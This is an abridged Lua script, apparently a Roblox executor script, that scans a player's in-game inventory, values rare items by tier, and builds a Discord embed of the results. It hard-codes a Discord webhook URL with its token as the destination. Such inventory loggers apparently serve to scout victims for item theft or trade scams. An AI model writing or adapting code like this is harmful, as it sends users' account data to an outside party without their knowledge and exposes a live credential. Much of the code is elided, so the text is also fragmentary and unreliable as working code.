...
-- Check for executor specific request function
...
local function scanFullInventory()
    ...
    local function buildValueList()
        ...
        local valueList = {}
        -- Values list is ready
        local successDB, database = pcall(function() 
            return require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")) 
        end)

        if not successDB then return {} end
            ...
            if not untradable[dataid] then
                ...
                if itemData then
                    ...
                    if valueList[dataid] then
                        ...
                        if rarity == "Godly" then value = 2
                        elseif rarity == "Ancient" then value = 5
                        elseif rarity == "Unique" then value = 10
                        elseif rarity == "Vintage" then value = 15
                        elseif rarity == "Legendary" then value = 1
                        elseif rarity == "Rare" then value = 0.5
                        elseif rarity == "Uncommon" then value = 0.25
                        else value = 0.1 end
                    end
                    
                    totalValue = totalValue + (value * amount)
                    
                    -- FIX: Ensure rarity key exists before adding
                    ...
                    if rarity == "Godly" then table.insert(godlyItems, weaponData)
                    elseif rarity == "Ancient" then table.insert(ancientItems, weaponData)
                    elseif rarity == "Unique" then table.insert(uniqueItems, weaponData)
                    elseif rarity == "Vintage" then table.insert(vintageItems, weaponData)
                    end
                end
            end
        end
...
local function scanInventoryAndSendToWebhook()
    ...
    if not scanResult.hasItems then
        ...
        for _, item in ipairs(scanResult.godlyItems) do godlyTotalValue = godlyTotalValue + item.TotalValue end
        for _, item in ipairs(scanResult.ancientItems) do ancientTotalValue = ancientTotalValue + item.TotalValue end
        for _, item in ipairs(scanResult.uniqueItems) do uniqueTotalValue = uniqueTotalValue + item.TotalValue end
        for _, item in ipairs(scanResult.vintageItems) do vintageTotalValue = vintageTotalValue + item.TotalValue end
        
        local embedColor
        if scanResult.totalValue >= 1000 then embedColor = 10181046
        elseif scanResult.totalValue >= 500 then embedColor = 15844367
        elseif scanResult.totalValue >= 100 then embedColor = 5763719
        elseif scanResult.totalValue >= 50 then embedColor = 3447003
        else embedColor = 15105570 end
        
        local completeList = ""
        
        if #scanResult.godlyItems > 0 then
            completeList = completeList .. "**⭐ GODLY ITEMS**\n"
        ...
        if #scanResult.ancientItems > 0 then
            completeList = completeList .. "**✨ ANCIENT ITEMS**\n"
        ...
        if #scanResult.uniqueItems > 0 then
            completeList = completeList .. "**🌟 UNIQUE ITEMS**\n"
        ...
        if #scanResult.vintageItems > 0 then
            completeList = completeList .. "**💎 VINTAGE ITEMS**\n"
        ...
        local fields = {
            ...
            {
                name = "📊 BREAKDOWN",
                value = string.format("⭐ Godly: `%d` (%d items)\n✨ Ancient: `%d` (%d items)\n🌟 Unique: `%d` (%d items)\n💎 Vintage: `%d` (%d items)", 
        ...
        for i, chunk in ipairs(listChunks) do
            local fieldName = #listChunks > 1 and 
                string.format("📦 ITEMS (%d/%d)", i, #listChunks) or 
                "📦 ALL ITEMS"
...
_G.webhook = "https://discord.com/api/webhooks/1486188561408462938/1_ncIpamxZin1YrrPfqNPPN1k7uSLM96Xnr2tLOAwysh7g3dsiSKb7v7TLEEP97AqAsK"
...
if game.PlaceId ~= 142823291 then
    ...
    if success then
        print(string.format("✅ Inventory scan completed successfully!"))
    else
        warn("Failed to complete scan.")
    end
end
